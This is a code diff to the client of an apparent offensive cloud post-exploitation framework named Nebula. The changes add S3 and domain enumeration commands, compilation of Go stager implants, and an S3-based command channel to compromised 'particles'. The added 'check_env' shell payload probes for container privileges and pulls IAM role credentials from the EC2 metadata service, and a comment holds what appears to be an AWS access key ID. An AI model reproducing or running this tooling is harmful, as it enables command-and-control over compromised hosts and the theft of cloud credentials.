@@ -14,6 +14,7 @@ import string
 import boto3
 import botocore
 import botocore.session
+import docker
 import prettytable
 import requests
 from colorama import init
@@ -31,7 +32,9 @@ from termcolor import colored
 import banner
 import commands.aws_get_user_id
 from commands.get_iam_users import list_aws_iam_users, get_aws_iam_user
+from commands.get_s3_buckets import list_aws_s3_buckets, get_aws_s3_bucket
 from commands.aws_s3_c2_client import getsendcommand
+from commands.get_domains import list_domains, get_domains
 from help import help
 
 init()
@@ -39,7 +42,7 @@ init()
 parser = argparse.ArgumentParser(description='------ Nebula Client Options ------')
 parser.add_argument('-ah', '--apiHost', type=str, help='The API Server Host.', default="127.0.0.1")
 parser.add_argument('-ap', '--apiPort', type=int, help='The API Server Port. (Default: 5000)', default=5000)
-parser.add_argument('-w', '--workspace', type=str, help='The Workspace to work with. (Required)', required=True)
+#parser.add_argument('-w', '--workspace', type=str, help='The Workspace to work with. (Required)', required=True)
 parser.add_argument('-u', '--username', type=str, help='The username to login as (Default \'cosmonaut\').')
 parser.add_argument('-p', '--password', type=str, help='The password for user \'cosmonaut\'. (Required)')
 parser.add_argument("-b", action='store_true', help="Do not print banner")
@@ -63,9 +66,10 @@ if args.config_file is None:
             password = getpass("Password: ")
 
     jwt_token = ""
-    workspace = args.workspace
+    #workspace = args.workspace
+    workspace = ""
 else:
-    if args.password or args.workspace:
+    if args.password: # or args.workspace:
         print("Either use a config file or use -dn (database name) and -p (password)")
         exit()
     else:
@@ -235,6 +239,8 @@ global web_proxies
 
 comms = {
     "list_aws_iam_users": None,
+    "list_aws_s3_buckets": None,
+    "get_aws_s3_bucket": None,
     "get_aws_iam_user": None,
     "show":{
         "web-proxies": None,
@@ -684,7 +690,9 @@ def main(workspace, particle, module_char):
 
         completer = NestedCompleter.from_nested_dict(comms)
 
-        com = "({})({})({}) >>> ".format(colored(workspace, "green"), colored(particle, "red"), colored(terminal, "blue"))
+        #com = "({})({})({}) >>> ".format(colored(workspace, "green"), colored(particle, "red"), colored(terminal, "blue"))
+        com = "({})({})({}) >>> ".format("", colored(particle, "red"),
+                                         colored(terminal, "blue"))
 
         history_file = FileHistory(".nebula-history-file")
         session = PromptSession(history=history_file)
@@ -696,6 +704,10 @@ def main(workspace, particle, module_char):
         command.strip()
 
         while True:
+            if curr_creds is None:
+                cur_creds_name = ""
+            else:
+                cur_creds_name = curr_creds['profile']
             useragent = ""
 
 
@@ -828,7 +840,7 @@ def main(workspace, particle, module_char):
                     for profile in all_sessions:
                         if profile['profile'] == cred_prof:
                             print(json.dumps(commands.aws_get_user_id.get_user_id(
-                                apihost, jwt_token, profile
+                                apihost, jwt_token, profile, useragent
                             ), indent=4, default=str))
                             break
 
@@ -916,7 +928,6 @@ def main(workspace, particle, module_char):
                                                           "aws_profile_name": cred_prof,
                                                           "workspace": workspace
                                                       }).text)
-
                         from pygments import highlight
                         from pygments.lexers import JsonLexer
                         from pygments.formatters import TerminalFormatter
@@ -963,7 +974,8 @@ def main(workspace, particle, module_char):
                                 # TerminalFormatter()
                                 output += colored("------------------------------------------------------------------\n",
                                                   "yellow", attrs=['bold'])
-                            pipepager(output, cmd='less -FR')
+                            #pipepager(output, cmd='less -FR')
+                            print(output)
                             output = ""
 
                     """
@@ -998,6 +1010,13 @@ def main(workspace, particle, module_char):
                         output = ""
                     """
 
+
+            elif command.split(" ")[0] == 'banner':
+                banner.banner(
+                    module_count_dict['nr_of_cloud_modules'],
+                    module_count_dict['nr_of_modules'],
+                    module_count_dict['all_count']
+                )
 
             elif command.split(" ")[0] == 'show':
                 if command.split(" ")[1] == 'all-regions':
@@ -1169,27 +1188,14 @@ def main(workspace, particle, module_char):
                             print(colored("-------------------------------------",
                                           "yellow"))
                             for key, value in sess.items():
-                                if key == "secret_key":
-                                    print("\t{}: {}".format(
-                                        colored(key, "red"),
-                                        colored(f"{value[0]}{(len(value) - 2) * '*'}{value[len(value) - 1]}", "blue")
-                                    ))
-                                elif key == "session_token":
-                                    print("\t{}: {}".format(
-                                        colored(key, "red"),
-                                        colored(f"{value[0]}{(len(value) - 2) * '*'}{value[len(value) - 1]}", "blue")
-                                    ))
-                                elif key == "azure_access_token":
-                                    print("\t{}: {}".format(
-                                        colored(key, "red"),
-                                        colored(f"{value[0]}{(len(value) - 2) * '*'}{value[len(value) - 1]}", "blue")
-                                    ))
-                                elif key == "azure_id_token":
-                                    print("\t{}: {}".format(
-                                        colored(key, "red"),
-                                        colored(f"{value[0]}{(len(value) - 2) * '*'}{value[len(value) - 1]}", "blue")
-                                    ))
-                                elif key == "azure_refresh_token":
+                                if key in [
+                                    "secret_key",
+                                    "digitalocean_token",
+                                    "session_token",
+                                    "azure_access_token",
+                                    "azure_id_token",
+                                    "azure_refresh_token"
+                                ]:
                                     print("\t{}: {}".format(
                                         colored(key, "red"),
                                         colored(f"{value[0]}{(len(value) - 2) * '*'}{value[len(value) - 1]}", "blue")
@@ -1197,8 +1203,9 @@ def main(workspace, particle, module_char):
                                 else:
                                     print("\t{}: {}".format(
                                         colored(key, "red"),
-                                        colored(value, "blue")
+                                        colored(f"{value}", "blue")
                                     ))
+
                             print()
 
                         try:
@@ -1210,7 +1217,7 @@ def main(workspace, particle, module_char):
                 if command.split(" ")[1] == 'modules':
                     column_width, row_width = os.get_terminal_size(0)
                     #table.max_width = column_width
-                    table = prettytable.PrettyTable(max_table_width=column_width)
+                    table = prettytable.PrettyTable(max_table_width=column_width, max_width=os.get_terminal_size().columns/2)
                     table.field_names = [colored('Modules', "green"), colored('Description', "green")]
 
                     '''table._max_width = {
@@ -1368,6 +1375,7 @@ def main(workspace, particle, module_char):
                                     "'{}'.".format(cred_prof), "blue") + colored("Use ", "green") + colored(
                                     "'show current-creds' ", "blue") + colored("to check them.", "green"))
                                 c = 1
+                                cur_creds_name = cred_prof
                                 break
                         if c == 0:
                             print(
@@ -1512,6 +1520,10 @@ def main(workspace, particle, module_char):
 
                     count = 0
                     for key, value in module_options['module_options'].items():
+                        if 'choices' in value and not value['value'] in value['choices']:
+                            print(colored(f"[*] Option '{key}' can only have the value: {value['choices']}", "red"))
+                            count += 1
+
                         if value['required'] == 'true' and value['value'] == "":
                             print(colored("[*] Option '{}' is not set!".format(key), "red"))
                             count += 1
@@ -1609,29 +1621,58 @@ def main(workspace, particle, module_char):
                                                 module_output[AWSregion] = RunModule(module_char, module_options, cred_prof, useragent, workspace, web_proxies, jwt_token, apihost, username, AWSregion)
 
 
-                                                if module_char.split("/")[0] == "stager" or module_char.split("/")[0] == "listeners":
+                                                #if module_char.split("/")[0] == "stager" or module_char.split("/")[0] == "listeners":
+                                                if module_char.split("/")[0] == "listeners":
                                                     if not "error" in module_output[AWSregion]:
-                                                        if not os.path.exists(".stagers"):
-                                                            os.makedirs(".stagers")
+                                                        if 'OutPutFile' in module_output[AWSregion]:
+                                                            if not os.path.exists(".stagers"):
+                                                                os.makedirs(".stagers")
 
-                                                        try:
-                                                            with open(
-                                                                    f".stagers/{AWSregion}_{module_output[AWSregion]['OutPutFile']}",
-                                                                    'w') as stagerfile:
-                                                                stagerfile.write(base64.b64decode(
-                                                                    module_output[AWSregion]['Code']).decode())
-                                                                stagerfile.close()
-                                                            del (module_output[AWSregion]['Code'])
-                                                            module_output[AWSregion]['OutPutFile'] = f".stagers/{AWSregion}_{module_output[AWSregion]['OutPutFile']}",
-                                                            #PrintAWSModule(module_output)
-                                                        except FileNotFoundError:
-                                                            print(
-                                                                colored(
-                                                                    "Please, only put the file name that will be stored on directory '.stagers'",
-                                                                    "red")
+                                                            try:
+                                                                if module_output['STAGER-TYPE'] == "terraform":
+                                                                    with open(
+                                                                            f".stagers/{AWSregion}_{module_output[AWSregion]['OutPutFile']}",
+                                                                            'w') as stagerfile:
+                                                                        stagerfile.write(base64.b64decode(
+                                                                            module_output[AWSregion]['Code']).decode())
+                                                                        stagerfile.close()
+                                                                    del (module_output[AWSregion]['Code'])
+                                                                    module_output[AWSregion]['OutPutFile'] = f".stagers/{AWSregion}_{module_output[AWSregion]['OutPutFile']}",
+                                                                elif module_output['STAGER-TYPE'] == "golang":
+                                                                    with open(
+                                                                            f".stagers/{AWSregion}_{module_output[AWSregion]['OutPutFile']}.go",
+                                                                            "w") as gofile:
+                                                                        gofile.write(base64.b64decode(
+                                                                            module_output[AWSregion]['Code']).decode())
+                                                                        gofile.close()
+                                                                    currdir = os.getcwd()
+                                                                    os.chdir(".stagers/")
+                                                                    goos = module_output['GOOS']
+                                                                    goarch = module_output['GOARCH']
+
+                                                                    os.popen(
+                                                                        f"go mod init golangs3stager; go mod tidy; GOOS={goos} GOARCH={goarch} go build -o {AWSregion}_{module_output[AWSregion]['OutPutFile']}")
+                                                                    os.chdir(currdir)
+                                                                    os.remove(
+                                                                        "./go.mod")
+                                                                    os.remove(
+                                                                        "./go.sum")
+                                                                    os.remove(
+                                                                        f"{AWSregion}_{module_output[AWSregion]['OutPutFile']}")
+                                                                    os.remove(
+                                                                        f"{AWSregion}_{module_output[AWSregion]['OutPutFile']}.go")
+                                                                    del (module_output[AWSregion]['Code'])
+                                                                    module_output[AWSregion][
+                                                                        'OutPutFile'] = f".stagers/{AWSregion}_{module_output[AWSregion]['OutPutFile']}",
+                                                                #PrintAWSModule(module_output)
+                                                            except FileNotFoundError:
+                                                                print(
+                                                                    colored(
+                                                                        "Please, only put the file name that will be stored on directory '.stagers'",
+                                                                        "red")
                                                             )
-                                                    #else:
-                                                    #    PrintAWSModule(module_output)
+                                                        #else:
+                                                        #    PrintAWSModule(module_output)
 
                                                 #else:
                                                 #    PrintAWSModule(module_output)
@@ -1644,27 +1685,96 @@ def main(workspace, particle, module_char):
 
 
                             else:
-                                module_output = RunModule(module_char, module_options, cred_prof, useragent, workspace, web_proxies,
-                                          jwt_token, apihost, username, None)
+                                module_output = RunModule(
+                                    module_char,
+                                    module_options,
+                                    cred_prof,
+                                    useragent,
+                                    workspace,
+                                    web_proxies,
+                                    jwt_token,
+                                    apihost,
+                                    username,
+                                    None
+                                )
 
                                 if module_char.split("/")[0] == "stager" or module_char.split("/")[0] == "listeners":
                                     if not "error" in module_output:
-                                        if not os.path.exists(".stagers"):
-                                            os.makedirs(".stagers")
+                                        if 'ModuleName' in module_output and "OutPutFile" in module_output['ModuleName']:
+                                            if not os.path.exists(".stagers"):
+                                                os.makedirs(".stagers")
 
-                                        try:
-                                            with open(f".stagers/{module_output['ModuleName']['OutPutFile']}", 'w') as stagerfile:
-                                                stagerfile.write(base64.b64decode(module_output["ModuleName"]['Code']).decode())
-                                                stagerfile.close()
-                                            del (module_output["ModuleName"]['Code'])
-                                            module_output["ModuleName"]['OutPutFile'] = f".stagers/{module_output['ModuleName']['OutPutFile']}"
+                                            try:
+                                                if module_char.split("_")[-1] == "terraform":
+                                                    with open(
+                                                            f".stagers/{module_output['ModuleName']['OutPutFile']}",
+                                                            'w') as stagerfile:
+                                                        stagerfile.write(base64.b64decode(
+                                                            module_output['ModuleName']['Code']).decode())
+                                                        stagerfile.close()
+                                                    del (module_output['ModuleName']['Code'])
+                                                    module_output['ModuleName'][
+                                                        'OutPutFile'] = f".stagers/{module_output['ModuleName']['OutPutFile']}",
+
+                                                elif module_char.split("_")[-1] == "golang":
+                                                    if not os.path.exists(f".stagers/{module_output['ModuleName']['OutPutFile']}"):
+                                                        os.mkdir(f".stagers/{module_output['ModuleName']['OutPutFile']}")
+
+
+                                                    with open(f".stagers/{module_output['ModuleName']['OutPutFile']}/{module_output['ModuleName']['OutPutFile']}.go", "w") as gofile:
+                                                        gofile.write(base64.b64decode(module_output['ModuleName']['Code']).decode())
+                                                        gofile.close()
+
+                                                    goos = module_options['module_options']['GOOS']['value']
+                                                    goarch = module_options['module_options']['GOARCH']['value']
+                                                    '''
+                                                    try:
+                                                        client = docker.from_env()
+                                                        client.images.pull('golang:latest')
+
+                                                        client.containers.run(
+                                                            'golang:latest', f"cd /stagers; GOOS={goos} GOARCH={goarch}; go mod init golangs3stager; go mod tidy; go build -o {module_output['ModuleName']['OutPutFile']}",
+                                                            volumes={
+                                                                f"{os.getcwd()}/.stagers/{module_output['ModuleName']['OutPutFile']}": {
+                                                                    'bind': "/stagers",
+                                                                    'mode': 'rw'
+                                                                }
+                                                            },
+                                                            detach=True
+                                                        )
+                                                    except Exception as e:
+                                                        print(
+                                                            colored(f"[*] {str(e)}", "red")
+                                                        )
+                                                    '''
+                                                    #currdir = os.getcwd()
+                                                    #os.chdir(f".stagers/{module_output['ModuleName']['OutPutFile']}")
+
+                                                    #goos = module_options['module_options']['GOOS']['value']
+                                                    #goarch = module_options['module_options']['GOARCH']['value']
+                                                    #print(f"GOOS={goos}; export GOARCH={goarch}; go mod init golangs3stager; go mod tidy; go build -o {module_output['ModuleName']['OutPutFile']}")
+                                                    #print(os.popen(f"export GOROOT=$(go env | grep GOROOT | cut -d \"'\" -f 2); export GOOS={goos}; export GOARCH={goarch}; go mod init golangs3stager; go mod tidy; go build -o {module_output['ModuleName']['OutPutFile']}").read())
+                                                    #os.chdir(currdir)
+
+                                                    # os.remove("./go.mod")
+                                                    # os.remove("./go.sum")
+                                                    # os.remove(f"{module_output['OutPutFile']}.go")
+
+                                                    del (module_output['ModuleName']['Code'])
+
+                                                    module_output['ModuleName']["Instructions"] = f"To build the binary, run: 'go mod init golangs3stager; go mod tidy; GOOS={goos} GOARCH={goarch} go build -o {module_output['ModuleName']['OutPutFile']}' inside directory .stagers/{module_output['ModuleName']['OutPutFile']} on another terminal"
+                                                    module_output['ModuleName'][
+                                                        'OutPutFile'] = f".stagers/{module_output['ModuleName']['OutPutFile']}/{module_output['ModuleName']['OutPutFile']}.go",
+
+                                                PrintAWSModule(module_output)
+                                            except FileNotFoundError:
+                                                print(
+                                                    colored(
+                                                        "Please, only put the file name that will be stored on directory '.stagers'",
+                                                        "red")
+                                                )
+                                        else:
                                             PrintAWSModule(module_output)
-                                        except FileNotFoundError:
-                                            print(
-                                                colored(
-                                                    "Please, only put the file name that will be stored on directory '.stagers'",
-                                                    "red")
-                                            )
                                     else:
                                         PrintAWSModule(module_output)
 
@@ -1674,16 +1784,94 @@ def main(workspace, particle, module_char):
                             module_output = RunModule(module_char, module_options, cred_prof, useragent, workspace, web_proxies, jwt_token, apihost, username, "")
                             PrintAWSModule(module_output)
 
+            elif command.split(" ")[0] == 'get_domain':
+                if len(command.split(" ")) < 2:
+                    print(colored("[*] Please provide a domain too. ", "red"))
+                else:
+                    get_domains_dict = get_domains(apihost, (command.split(" ")[1]).strip().replace("\n", ""), jwt_token)
+                    if "error" in get_domains_dict:
+                        print(colored("[*] {}".format(get_domains_dict['error']), "red"))
+
+                    else:
+                        from pygments import highlight
+                        from pygments.lexers import JsonLexer
+                        from pygments.formatters import TerminalFormatter
+                        for title_name, json_data in get_domains_dict.items():
+                            if isinstance(json_data, list):
+                                output += colored(
+                                    "------------------------------------------------------------------\n",
+                                    "yellow", attrs=['bold'])
+                                for data in json_data:
+                                    output += colored(
+                                        "{}: {}\n".format(title_name, data[title_name]),
+                                        "yellow", attrs=['bold'])
+                                    output += colored(
+                                        "------------------------------------------------------------------\n",
+                                        "yellow", attrs=['bold'])
+                                    raw_json = json.dumps(data, indent=4)
+                                    output += highlight(
+                                        raw_json,
+                                        JsonLexer(),
+                                        TerminalFormatter()
+                                    )
+
+                                    # Print to console
+
+                                    output += colored(
+                                        "------------------------------------------------------------------\n",
+                                        "yellow",
+                                        attrs=['bold'])
+
+            elif command.split(" ")[0] == 'get_aws_s3_bucket':
+                if len(command.split(" ")) < 2:
+                    print(colored("[*] Please provide a username too. ", "red"))
+                else:
+                    get_aws_s3_bucket_dict = get_aws_s3_bucket(apihost, (command.split(" ")[1]).strip().replace("\n", ""), jwt_token)
+                    if "error" in get_aws_s3_bucket_dict:
+                        print(colored("[*] {}".format(get_aws_s3_bucket_dict['error']), "red"))
+
+                    else:
+                        from pygments import highlight
+                        from pygments.lexers import JsonLexer
+                        from pygments.formatters import TerminalFormatter
+                        for title_name, json_data in get_aws_s3_bucket_dict.items():
+                            if isinstance(json_data, list):
+                                output += colored(
+                                    "------------------------------------------------------------------\n",
+                                    "yellow", attrs=['bold'])
+                                for data in json_data:
+                                    output += colored(
+                                        "{}: {}\n".format(title_name, data[title_name]),
+                                        "yellow", attrs=['bold'])
+                                    output += colored(
+                                        "------------------------------------------------------------------\n",
+                                        "yellow", attrs=['bold'])
+                                    raw_json = json.dumps(data, indent=4)
+                                    output += highlight(
+                                        raw_json,
+                                        JsonLexer(),
+                                        TerminalFormatter()
+                                    )
+
+                                    # Print to console
+
+                                    output += colored(
+                                        "------------------------------------------------------------------\n",
+                                        "yellow",
+                                        attrs=['bold'])
+
             elif command.split(" ")[0] == 'get_aws_iam_user':
                 if len(command.split(" ")) < 2:
                     print(colored("[*] Please provide a username too. ", "red"))
                 else:
                     get_iam_user_dict = get_aws_iam_user(apihost, (command.split(" ")[1]).strip().replace("\n", ""), jwt_token)
-                    print(get_iam_user_dict)
                     if "error" in get_iam_user_dict:
                         print(colored("[*] {}".format(get_iam_user_dict['error']), "red"))
 
                     else:
+                        from pygments import highlight
+                        from pygments.lexers import JsonLexer
+                        from pygments.formatters import TerminalFormatter
                         for title_name, json_data in get_iam_user_dict.items():
                             if isinstance(json_data, list):
                                 output += colored(
@@ -1696,7 +1884,15 @@ def main(workspace, particle, module_char):
                                     output += colored(
                                         "------------------------------------------------------------------\n",
                                         "yellow", attrs=['bold'])
-                                    list_dictionary(data, n_tab)
+                                    raw_json = json.dumps(data, indent=4)
+                                    output += highlight(
+                                        raw_json,
+                                        JsonLexer(),
+                                        TerminalFormatter()
+                                    )
+
+                                    # Print to console
+
                                     output += colored(
                                         "------------------------------------------------------------------\n",
                                         "yellow",
@@ -1711,12 +1907,132 @@ def main(workspace, particle, module_char):
                                 output += colored(
                                     "------------------------------------------------------------------\n",
                                     "yellow", attrs=['bold'])
-                                list_dictionary(json_data, n_tab)
+                                raw_json = json.dumps(json_data, indent=4)
+                                output += highlight(
+                                    raw_json,
+                                    JsonLexer(),
+                                    TerminalFormatter()
+
+                                )
+                                # TerminalFormatter()
                                 output += colored(
                                     "------------------------------------------------------------------\n",
                                     "yellow", attrs=['bold'])
                             pipepager(output, cmd='less -FR')
+                            print(output)
                             output = ""
+
+            elif command.split(" ")[0] == 'list_domains':
+                list_domains_dict = list_domains(apihost, jwt_token)
+
+                if "error" in list_domains_dict:
+                    print(colored("[*] {}".format(list_domains_dict['error']), "red"))
+
+                else:
+                    from pygments import highlight
+                    from pygments.lexers import JsonLexer
+                    from pygments.formatters import TerminalFormatter
+                    for title_name, json_data in list_domains_dict.items():
+                        if isinstance(json_data, list):
+                            output += colored("------------------------------------------------------------------\n",
+                                              "yellow", attrs=['bold'])
+                            for data in json_data:
+                                output += colored(
+                                    "{}: {}\n".format(title_name, data[title_name]),
+                                    "yellow", attrs=['bold'])
+                                output += colored(
+                                    "------------------------------------------------------------------\n",
+                                    "yellow", attrs=['bold'])
+                                raw_json = json.dumps(data, indent=4)
+                                output += highlight(
+                                    raw_json,
+                                    JsonLexer(),
+                                    TerminalFormatter()
+                                )
+
+                                # Print to console
+
+                                output += colored(
+                                    "------------------------------------------------------------------\n",
+                                    "yellow",
+                                    attrs=['bold'])
+                        else:
+                            output += colored("------------------------------------------------------------------\n",
+                                              "yellow", attrs=['bold'])
+                            output += colored(
+                                "{}: {}\n".format(title_name, json_data[title_name]),
+                                "yellow", attrs=['bold'])
+                            output += colored("------------------------------------------------------------------\n",
+                                              "yellow", attrs=['bold'])
+                            raw_json = json.dumps(json_data, indent=4)
+                            output += highlight(
+                                raw_json,
+                                JsonLexer(),
+                                TerminalFormatter()
+
+                            )
+                            # TerminalFormatter()
+                            output += colored("------------------------------------------------------------------\n",
+                                              "yellow", attrs=['bold'])
+                        pipepager(output, cmd='less -FR')
+                        print(output)
+                        output = ""
+
+            elif command.split(" ")[0] == 'list_aws_s3_buckets':
+                list_aws_s3_buckets_dict = list_aws_s3_buckets(apihost, jwt_token)
+
+                if "error" in list_aws_s3_buckets_dict:
+                    print(colored("[*] {}".format(list_aws_s3_buckets_dict['error']), "red"))
+
+                else:
+                    from pygments import highlight
+                    from pygments.lexers import JsonLexer
+                    from pygments.formatters import TerminalFormatter
+                    for title_name, json_data in list_aws_s3_buckets_dict.items():
+                        if isinstance(json_data, list):
+                            output += colored("------------------------------------------------------------------\n",
+                                              "yellow", attrs=['bold'])
+                            for data in json_data:
+                                output += colored(
+                                    "{}: {}\n".format(title_name, data[title_name]),
+                                    "yellow", attrs=['bold'])
+                                output += colored(
+                                    "------------------------------------------------------------------\n",
+                                    "yellow", attrs=['bold'])
+                                raw_json = json.dumps(data, indent=4)
+                                output += highlight(
+                                    raw_json,
+                                    JsonLexer(),
+                                    TerminalFormatter()
+                                )
+
+                                # Print to console
+
+                                output += colored(
+                                    "------------------------------------------------------------------\n",
+                                    "yellow",
+                                    attrs=['bold'])
+                        else:
+                            output += colored("------------------------------------------------------------------\n",
+                                              "yellow", attrs=['bold'])
+                            output += colored(
+                                "{}: {}\n".format(title_name, json_data[title_name]),
+                                "yellow", attrs=['bold'])
+                            output += colored("------------------------------------------------------------------\n",
+                                              "yellow", attrs=['bold'])
+                            raw_json = json.dumps(json_data, indent=4)
+                            output += highlight(
+                                raw_json,
+                                JsonLexer(),
+                                TerminalFormatter()
+
+                            )
+                            # TerminalFormatter()
+                            output += colored("------------------------------------------------------------------\n",
+                                              "yellow", attrs=['bold'])
+                        pipepager(output, cmd='less -FR')
+                        print(output)
+                        output = ""
 
             elif command.split(" ")[0] == 'list_aws_iam_users':
                 list_iam_users_dict = list_aws_iam_users(apihost, jwt_token)
@@ -1772,42 +2088,14 @@ def main(workspace, particle, module_char):
                             output += colored("------------------------------------------------------------------\n",
                                               "yellow", attrs=['bold'])
                         pipepager(output, cmd='less -FR')
+                        print(output)
                         output = ""
-
-                    """for title_name, json_data in list_iam_users_dict.items():
-                        if isinstance(json_data, list):
-                            output += colored("------------------------------------------------------------------\n",
-                                              "yellow", attrs=['bold'])
-                            for data in json_data:
-                                output += colored(
-                                    "{}: {}\n".format(title_name, data[title_name]),
-                                    "yellow", attrs=['bold'])
-                                output += colored(
-                                    "------------------------------------------------------------------\n",
-                                    "yellow", attrs=['bold'])
-                                list_dictionary(data, n_tab)
-                                output += colored(
-                                    "------------------------------------------------------------------\n",
-                                    "yellow",
-                                    attrs=['bold'])
-                        else:
-                            output += colored("------------------------------------------------------------------\n",
-                                              "yellow", attrs=['bold'])
-                            output += colored(
-                                "{}: {}\n".format(title_name, json_data[title_name]),
-                                "yellow", attrs=['bold'])
-                            output += colored("------------------------------------------------------------------\n",
-                                              "yellow", attrs=['bold'])
-                            list_dictionary(json_data, n_tab)
-                            output += colored("------------------------------------------------------------------\n",
-                                              "yellow", attrs=['bold'])
-                        pipepager(output, cmd='less -FR')
-                        output = """""
 
             elif command.split(" ")[0] == 'shell':
                 if particle == "":
                     print(colored("[*] Please select a particle using: 'use particle <particle name>'", "red"))
                 else:
+
                     shellchekc = 0
                     for particlename in particles:
                         if particlename['particle_key_name'] == particle:
@@ -1823,6 +2111,11 @@ def main(workspace, particle, module_char):
                                         s3profile = boto3.client(
                                             **listenerargs
                                         )
+
+                                        command = command.replace("shell ", "").strip()
+                                        if command == "check_env":
+                                            command = 'bash -c \'echo "Instance User: $(whoami)";echo "Instance Hostname: $(hostname)";echo "Instance IP Info: $(ip a)";if [ "$(ps 1 | grep -v "PID" | cut -d "/" -f 3)" != "init" ];  then echo "Is Docker: True";  apt update > /dev/null && apt install fdisk curl iproute2 -y > /dev/null;  echo "Privileged Container: $(bash -c "ip link add dummy0 type dummy > /dev/null; if [ $? -eq 0 ]; then echo "True"; else echo "False"; fi")";  echo "Docker Sock Mounted: $(if [ -f /var/www/html ]; then echo "True"; else echo "False"; fi)";fi;if [ $(curl -I http://169.254.169.254/latest/meta-data/ --connect-timeout 10 | grep "HTTP" | cut -d " " -f 2) == "200" ]; then  echo "Instance Meta-Data V1 Enabled: True";  echo "InstanceId: $(curl http://169.254.169.254/latest/meta-data/instance-id)";  echo "Instance Public IP: $(curl http://169.254.169.254/latest/meta-data/public-ipv4)";  echo "Instance Private IP: $(curl http://169.254.169.254/latest/meta-data/local-ipv4)";  echo "Instance VPC ID: $(curl http://169.254.169.254/latest/meta-data/instance-id)";  if [ $(curl http://169.254.169.254/latest/meta-data/iam -I | grep "HTTP" | cut -d " " -f 2) == "200" ]; then    profilename=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials);    echo "Instance Profile Name: $profilename";    echo "Instance Profile Creds: $(curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$profilename")";  fi;elif [ $(curl -I http://169.254.169.254/latest/meta-data/ --connect-timeout 10 | grep "HTTP" | cut -d " " -f 2) == "401" ]; then  echo "Instance Meta-Data V1 Enabled: False";  echo "Instance Meta-Data V2 Enabled: True";  echo "InstanceId: $(TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`; curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/instance-id)";  echo "Instance Public IP: $(TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`; curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/public-ipv4)";  echo "Instance Private IP: $(TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`; curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/local-ipv4)";  echo "Instance VPC ID: $(TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`; curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/instance-id)";  if [ $(TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`; curl -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam" -I | grep "HTTP" | cut -d " " -f 2) == "200" ]; then    profilename=$(TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`; curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials);    echo "Instance Profile Name: $profilename";    echo "Instance Profile Creds: $(TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`; curl -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$profilename")";  fi;fi;\''
+
                                         getsendcommand(
                                             bucket_name=listenerlist['listener_bucket_name'],
                                             particle_name=particle,
@@ -1845,9 +2138,6 @@ def main(workspace, particle, module_char):
                                         )
                     if shellchekc == 0:
                         print(colored("[*] Particle does not exist", "red"))
-
-
-
 
             elif command.split(" ")[0] == 'remove':
                 if command.split(" ")[1] == 'user':
@@ -2286,9 +2576,20 @@ def main(workspace, particle, module_char):
                         print(colored("[*] The right command is: set aws-credentials <profile name>", "red"))
                     elif len(command.split(" ")) > 2:
                         access_key_id = input("Access Key ID: ")
-                        secret_key = input("Secret Key ID: ")
-                        region = input("Region: ")
 
+                        # AKIA4MTWLERB3KP6LC66
+                        while not re.match("AKIA[A-Z0-9]{16}", access_key_id) and not re.match("ASIA[A-Z0-9]{16}", access_key_id):
+                            access_key_id = input("Access Key ID: ")
+
+                        secret_key = input("Secret Key ID: ")
+                        while not re.match("[A-Z0-9a-z+/]{40}", secret_key):
+                            secret_key = input("Secret Key ID: ")
+
+                        region = input("Region: ")
+                        while not region in AWS_REGIONS:
+                            region = input("Region: ")
+
+                        sess_test['provider'] = "AWS"
                         sess_test['profile'] = str(command.split(" ")[2])
                         sess_test['access_key_id'] = str(access_key_id)
                         sess_test['secret_key'] = str(secret_key)
@@ -2339,6 +2640,7 @@ def main(workspace, particle, module_char):
                                         'secret_key': "",
                                         'region': ""
                                     }
+                                    curr_creds['provider'] = "AWS"
                                     curr_creds['profile'] = set_aws_creds_body["aws_profile_name"]
                                     curr_creds['access_key_id'] = set_aws_creds_body["aws_access_key"]
                                     curr_creds['secret_key'] = set_aws_creds_body["aws_secret_key"]
@@ -2387,8 +2689,8 @@ def main(workspace, particle, module_char):
                 except Exception as e:
                     print(colored("[*] '{}' is not a valid command.".format(command), "red"))
 
-            com = "({})({})({}) >>> ".format(colored(workspace, "green"), colored(particle, "red"),
-                                             colored(terminal, "blue"))
+            #com = "({})({})({}) >>> ".format(colored(workspace, "green"), colored(particle, "red"), colored(terminal, "blue"))
+            com = "({})({})({}) >>> ".format(colored(cur_creds_name, "green"), colored(particle, "red"), colored(terminal, "blue"))
             command = session.prompt(
                 ANSI(com),
                 completer=completer,
